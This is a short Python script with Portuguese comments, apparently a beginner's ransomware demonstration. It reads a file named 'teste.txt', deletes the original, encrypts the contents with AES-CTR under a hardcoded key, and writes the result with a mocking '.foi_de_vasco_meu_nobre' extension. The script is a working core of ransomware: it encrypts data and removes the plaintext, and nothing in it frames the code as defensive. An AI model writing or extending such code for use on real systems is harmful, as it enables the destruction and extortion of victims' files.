import os
import pyaes

## abrir arquivo a ser criptografado

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()

## rm arquivo original

os.remove(file_name)

## definir a chave de encriptacao
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar
crypto_data = aes.encrypt(file_data)

## salvar
new_file = file_name + '.foi_de_vasco_meu_nobre'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
